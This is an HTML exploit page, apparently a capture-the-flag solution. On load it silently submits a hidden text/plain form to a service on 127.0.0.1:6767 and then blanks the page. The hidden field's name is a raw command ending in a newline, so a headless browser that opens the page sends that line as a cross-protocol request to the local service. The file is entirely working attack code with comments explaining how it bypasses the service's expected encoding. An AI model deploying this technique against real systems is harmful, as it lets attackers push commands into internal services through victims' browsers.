<!DOCTYPE html>
<html>
<head>
    <title>Exploit Vector V5</title>
</head>
<body>
    <!-- 
      We force standard text/plain encoding. 
      The name of the input field becomes the absolute first set of text characters 
      sent across the network boundary, bypassing binary WebRTC encapsulation.
    -->
    <form id="exploitForm" action="http://127.0.0.1:6767" method="POST" enctype="text/plain">
        <input type="hidden" name="give me the flag bro&#10;" value="">
    </form>

    <script>
        // Trigger the submission instantly when headless Firefox executes the DOM context
        window.onload = function() {
            document.getElementById('exploitForm').submit();
            
            // Self-terminate execution shortly after to release the container thread
            setTimeout(() => {
                window.location.href = "about:blank";
            }, 1000);
        };
    </script>
</body>
</html>
